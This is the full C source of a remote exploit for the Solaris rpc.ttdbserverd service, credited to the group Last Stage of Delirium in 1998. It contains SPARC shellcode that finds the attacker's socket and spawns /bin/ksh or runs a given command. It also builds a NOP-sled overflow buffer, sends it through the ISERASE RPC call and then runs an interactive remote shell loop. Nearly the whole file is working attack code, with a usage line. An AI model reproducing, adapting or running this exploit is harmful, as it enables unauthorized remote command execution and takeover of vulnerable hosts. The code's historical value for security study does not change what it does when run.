/*## copyright LAST STAGE OF DELIRIUM jul 1998 poland        *://lsd-pl.net/ #*/
/*## rpc.ttdbserverd                                                         #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

int adrnum;
int nopnum;

#define TTDBSERVERD_PROG 100083
#define TTDBSERVERD_VERS 1
#define TTDBSERVERD_ISERASE 7

char findsckcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode-4>      */
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode>        */
    "\x7f\xff\xff\xff"     /* call    <findsckcode+4>      */
    "\xa0\x20\x3f\xff"     /* sub     %g0,-1,%l0           */
    "\xa4\x03\xff\xd0"     /* add     %o7,-48,%l2          */
    "\xa6\x10\x20\x44"     /* mov     0x44,%l3             */
    "\xa8\x10\x23\xff"     /* mov     0x3ff,%l4            */
    "\xaa\x03\xe0\x44"     /* add     %o7,68,%l5           */
    "\x81\xc5\x60\x08"     /* jmp     %l5+8                */

    "\xaa\x10\x20\xff"     /* mov     0xff,%l5             */
    "\xab\x2d\x60\x08"     /* sll     %l5,8,%l5            */
    "\xaa\x15\x60\xff"     /* or      %l5,0xff,%l5         */
    "\xe2\x03\xff\xd0"     /* ld      [%o7-48],%l1         */
    "\xac\x0c\x40\x15"     /* and     %l1,%l5,%l6          */
    "\x2b\x00\x00\x00"     /* sethi   %hi(0x00000000),%l5  */
    "\xaa\x15\x60\x00"     /* or      %l5,0x000,%l5        */
    "\xac\x05\x40\x16"     /* add     %l5,%l6,%l6          */
    "\xac\x05\xbf\xff"     /* add     %l6,-1,%l6           */
    "\x80\xa5\xbf\xff"     /* cmp     %l6,-1               */
    "\x02\xbf\xff\xf5"     /* be      <findsckcode+32>     */
    "\xaa\x03\xe0\x7c"     /* add     %o7,0x7c,%l5         */

    "\xe6\x23\xff\xc4"     /* st      %l3,[%o7-60]         */
    "\xc0\x23\xff\xc8"     /* st      %g0,[%o7-56]         */
    "\xe4\x23\xff\xcc"     /* st      %l2,[%o7-52]         */
    "\x90\x04\x3f\xff"     /* add     %l0,-1,%o0           */
    "\xaa\x10\x20\x54"     /* mov     0x54,%l5             */
    "\xad\x2d\x60\x08"     /* sll     %l5,8,%l6            */
    "\x92\x15\xa0\x91"     /* or      %l6,0x91,%o1         */
    "\x94\x03\xff\xc4"     /* add     %o7,-60,%o2          */
    "\x82\x10\x20\x36"     /* mov     0x36,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\xa0\x24\x3f\xff"     /* sub     %l0,-1,%l0           */
    "\x1a\xbf\xff\xe9"     /* bcc     <findsckcode+36>     */
    "\x80\xa4\x23\xff"     /* cmp     %l0,0x3ff            */
    "\x04\xbf\xff\xf3"     /* bl      <findsckcode+84>     */

    "\xaa\x20\x3f\xff"     /* sub     %g0,-1,%l5           */
    "\x90\x05\x7f\xff"     /* add     %l5,-1,%o0           */
    "\x82\x10\x20\x06"     /* mov     0x6,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\x90\x04\x3f\xfe"     /* add     %l0,-2,%o0           */
    "\x82\x10\x20\x29"     /* mov     0x29,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\xaa\x25\x7f\xff"     /* sub     %l5,-1,%l5           */
    "\x80\xa5\x60\x03"     /* cmp     %l5,3                */
    "\x04\xbf\xff\xf8"     /* ble     <findsckcode+144>    */
    "\x80\x1c\x40\x11"     /* xor     %l1,%l1,%g0          */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char cmdshellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <cmdshellcode-4>     */
    "\x20\xbf\xff\xff"     /* bn,a    <cmdshellcode>       */
    "\x7f\xff\xff\xff"     /* call    <cmdshellcode+4>     */
    "\x90\x03\xe0\x34"     /* add     %o7,52,%o0           */
    "\x92\x23\xe0\x20"     /* sub     %o7,32,%o1           */
    "\xa2\x02\x20\x0c"     /* add     %o0,12,%l1           */
    "\xa4\x02\x20\x10"     /* add     %o0,16,%l2           */
    "\xc0\x2a\x20\x08"     /* stb     %g0,[%o0+8]          */
    "\xc0\x2a\x20\x0e"     /* stb     %g0,[%o0+14]         */
    "\xd0\x23\xff\xe0"     /* st      %o0,[%o7-32]         */
    "\xe2\x23\xff\xe4"     /* st      %l1,[%o7-28]         */
    "\xe4\x23\xff\xe8"     /* st      %l2,[%o7-24]         */
    "\xc0\x23\xff\xec"     /* st      %g0,[%o7-20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh    -c  "
;

static char nop[]="\x80\x1c\x40\x11";

typedef struct{char *string;}req_t;

bool_t xdr_req(XDR *xdrs,req_t *obj){
    if(!xdr_string(xdrs,&obj->string,~0)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=1,vers=0,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("copyright LAST STAGE OF DELIRIUM jul 1998 poland  //lsd-pl.net/\n");
    printf("rpc.ttdbserverd for solaris 2.3 2.4 2.5 2.5.1 2.6 sparc\n\n");

    if(argc<2){
        printf("usage: %s address [-s|-c command] [-p port] [-v 6]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:v:"))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'c': flag=0;cmd=optarg;break;
        case 'p': port=atoi(optarg);break;
        case 'v': vers=atoi(optarg);
        }
    }

    if(vers==6){
        *(unsigned long*)address=htonl(0xeffff420+1200+552);
        adrnum=1200;
        nopnum=1300;
    }else{
        *(unsigned long*)address=htonl(0xefffdadc+1000+4500);
        adrnum=3000;
        nopnum=6000;
    }

    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,TTDBSERVERD_PROG,TTDBSERVERD_VERS,&sck,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }
    cl->cl_auth=authunix_create("localhost",0,0,0,NULL);

    b=buffer;
    for(i=0;i<adrnum;i++) *b++=address[i%4];
    for(i=0;i<nopnum;i++) *b++=nop[i%4];
    if(flag){
        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);;
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=-ntohs(adr.sin_port);
        printf("port=%d connected! ",-n);fflush(stdout);

        *((unsigned long*)(&findsckcode[56]))|=htonl((n>>10)&0x3fffff);
        *((unsigned long*)(&findsckcode[60]))|=htonl(n&0x3ff);
        for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    }else{
        for(i=0;i<strlen(cmdshellcode);i++) *b++=cmdshellcode[i];
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
        *b++=';';
    }
    *b++=':';
    *b=0;

    req.string=buffer;

    stat=clnt_call(cl,TTDBSERVERD_ISERASE,xdr_req,&req,xdr_void,NULL,tm);
    if(stat==RPC_SUCCESS) {printf("\nerror: not vulnerable\n");exit(-1);}
    printf("sent!\n");if(!flag) exit(0);

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}
